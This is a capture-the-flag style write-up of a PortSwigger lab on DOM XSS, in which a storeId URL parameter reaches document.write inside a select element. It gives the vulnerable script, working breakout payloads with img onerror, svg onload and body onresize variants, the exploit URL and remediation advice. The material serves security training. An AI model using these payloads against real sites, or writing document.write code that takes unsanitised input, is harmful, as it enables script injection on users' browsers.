# PortSwigger — DOM XSS in `document.write` Sink Using Source `location.search` Inside a Select Element

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The stock checker functionality reads a `storeId` parameter from the URL via `location.search` and passes it unsanitised into `document.write`, embedding it inside a `<select>` element. Because `document.write` renders raw HTML, injecting closing tags for `</option>` and `</select>` breaks out of the select context entirely. A trailing `<img src=1 onerror=alert(1)>` then executes in the free DOM. The lab is solved by appending `&storeId=</option></select><img src=1 onerror=alert(1)>` to any product page URL.

**Lab URL:** `https://0ade00b7046984ac802e5d4400800096.web-security-academy.net/`

---

## Challenge Description

> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element. To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — DOM-based**
- Goal: Break out of the `<select>` element and call `alert(1)`

---

## Recon

### Step 1 — Identify the sink

Navigate to any product page and open the page source with `Ctrl+U`. Locate the inline script responsible for the stock checker. It reads a parameter from the URL and writes it directly into the DOM:

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
stores.forEach(function(s) {
    document.write('<option>' + s + '</option>');
});
document.write('</select>');
```

The value of `storeId` is concatenated directly into an HTML string and handed to `document.write` — no encoding, no sanitisation.

### Step 2 — Confirm the source

The **source** is `location.search`. The parameter `storeId` is extracted using `URLSearchParams.get()` and flows immediately into the **sink** (`document.write`) without any intermediate transformation or encoding.

### Step 3 — Understand the injection context

When a legitimate `storeId` is provided (e.g. `?storeId=London`), the generated HTML looks like this:

```html
<select name="storeId">
  <option selected>London</option>
  <option>Paris</option>
  <option>Milan</option>
</select>
```

The injection point sits **inside** `<option selected>…</option>`, which is itself inside `<select>`. To reach a free HTML context where event handlers can fire, both `</option>` and `</select>` must be explicitly closed.

### Step 4 — Confirm the breakout

Append a test value to the URL:

```
?productId=1&storeId=test</option></select><b>INJECTED
```

Open DevTools → **Elements** tab and inspect the DOM. The `<select>` element closes where expected and `<b>INJECTED</b>` appears as a sibling element in the free DOM — confirming that HTML injection is possible and that the browser parses the injected tags correctly.

---

## Understanding the Vulnerability

### Source → Sink data flow

```
location.search
    └── URLSearchParams.get('storeId')   ← attacker-controlled input
            └── document.write(...)      ← raw HTML written to the DOM
```

`document.write` is one of the most dangerous DOM sinks because it accepts an **arbitrary HTML string** and passes it directly to the HTML parser. Any tags, attributes, or event handlers included in the string are interpreted and rendered as genuine HTML — identical in effect to having been written by the server.

### Why the `<select>` context matters

The HTML parser enforces strict rules about which elements are valid children of `<select>`. Specifically:

- Inside a `<select>`, only `<option>`, `<optgroup>`, and `<script>` are valid children.
- `<script>` tags injected inside a `<select>` are **silently ignored** by the parser.
- Inline event handlers on `<option>` elements (e.g. `onerror`, `onmouseover`) do not fire in most browsers.

This means a naive payload like `<script>alert(1)</script>` or `" onmouseover="alert(1)` would not work here. The attacker must **escape the select context entirely** before injecting an active element.

### Character encoding analysis

| Character | Encoded / Escaped? | Consequence |
|---|---|---|
| `<` | ❌ No | Can inject raw HTML tags |
| `>` | ❌ No | Can close existing tags |
| `'` | ❌ No | Not relevant — sink is `document.write`, not a JS string |
| `"` | ❌ No | Not relevant — not inside an HTML attribute |
| `/` | ❌ No | Can write closing tags such as `</select>` |

No character is filtered or encoded. The input is reflected verbatim into the `document.write` call.

---

## Exploitation

### The Payload

```
</option></select><img src=1 onerror=alert(1)>
```

### What it produces in the DOM

```html
<select name="storeId">
  <option selected></option>   <!-- </option> closes the open option -->
</select>                      <!-- </select> closes the select element -->
<img src="1">                  <!-- injected into the free DOM -->
                               <!-- src=1 fails to load → onerror fires → alert(1) -->
```

### Step-by-step exploitation

1. Navigate to any product page in the lab, e.g.:
   ```
   https://0ade00b7046984ac802e5d4400800096.web-security-academy.net/product?productId=1
   ```
2. Append the `storeId` parameter with the payload directly in the URL bar:
   ```
   https://0ade00b7046984ac802e5d4400800096.web-security-academy.net/product?productId=1&storeId=</option></select><img src=1 onerror=alert(1)>
   ```
3. Press **Enter**
4. The page loads, the inline script executes, `document.write` renders the payload, `onerror` fires → `alert(1)` executes → **lab solved** ✅

### Execution Flow

```
Attacker crafts URL: ?productId=1&storeId=</option></select><img src=1 onerror=alert(1)>
        ↓
Browser parses location.search — no server-side processing
        ↓
JS reads storeId value via URLSearchParams.get('storeId')
        ↓
document.write('<option selected>' + payload + '</option>') executes
        ↓
HTML parser receives: <option selected></option></select><img src=1 onerror=alert(1)></option>
        ↓
</option> closes the open <option>
</select> closes the <select> — injection now in free DOM context
        ↓
<img src=1> is parsed as a legitimate sibling element
src=1 triggers a failed load → onerror event fires
        ↓
alert(1) executes
        ↓
LAB SOLVED ✅
```

---

## Alternative Payloads

Any element that supports event handlers and can be triggered without user interaction works as a carrier once the `<select>` context is escaped:

```
</option></select><svg onload=alert(1)>
```

Produces:

```html
<select name="storeId">
  <option selected></option>
</select>
<svg onload="alert(1)"></svg>
```

`<svg>` fires `onload` synchronously as soon as it is inserted into the DOM — no failed resource load required, making it marginally more reliable than `<img onerror>` in environments that eagerly cache or preload resources.

```
</option></select><body onresize=alert(1)>
```

Useful in scenarios where the attacker can control the viewport (e.g. delivering the URL inside an `<iframe>` and resizing it), but requires user interaction or additional attacker control in standard delivery.

---

## DOM XSS vs Reflected XSS — Key Distinction

| Property | Reflected XSS | DOM-based XSS |
|---|---|---|
| Payload travels to server | ✅ Yes | ❌ No |
| Payload appears in server response | ✅ Yes | ❌ No |
| Processing happens in | Server-side template | Client-side JavaScript |
| Visible in raw HTTP response | ✅ Yes | ❌ No |
| Detectable by server-side WAF | ✅ Potentially | ❌ Harder |
| Source | HTTP response body | DOM API (e.g. `location.search`) |
| Sink | HTML parser (via response) | DOM sink (e.g. `document.write`) |

In this lab, the payload **never reaches the server**. The server returns the same page regardless of the `storeId` value. The vulnerability exists entirely in the client-side JavaScript that reads `location.search` and passes it to `document.write`.

---

## Key Takeaways

- **`document.write` is a highly dangerous sink** — it passes its argument directly to the HTML parser with no encoding, making any unsanitised input a potential XSS vector
- **Injection context determines the payload shape** — being inside a `<select>` requires explicitly escaping with `</option></select>` before any active element can be injected; naive payloads like `<script>` or inline event handlers on `<option>` are silently ignored by the parser
- **DOM-based XSS bypasses server-side defences** — because the payload is processed entirely by client-side JavaScript, server-side WAFs, output encoding middleware, and HTTP response scanning tools cannot detect or block this class of attack
- **The source is `location.search`** — any URL parameter can be an attacker-controlled source if it is read by client-side JavaScript and passed unsanitised to a dangerous sink
- **The fix:** avoid `document.write` entirely; if dynamic HTML is required, use `textContent` or `innerText` for plain text, or sanitise HTML with a trusted library (e.g. DOMPurify) before assigning to `innerHTML`. For populating a `<select>`, create `<option>` elements programmatically via `document.createElement` and set their `.textContent` property — this ensures values are always treated as text, never as markup

---

## References

- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger — DOM XSS Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)
- [PortSwigger — Controlling the web message source](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [MDN — document.write()](https://developer.mozilla.org/en-US/docs/Web/API/Document/write)
- [MDN — URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)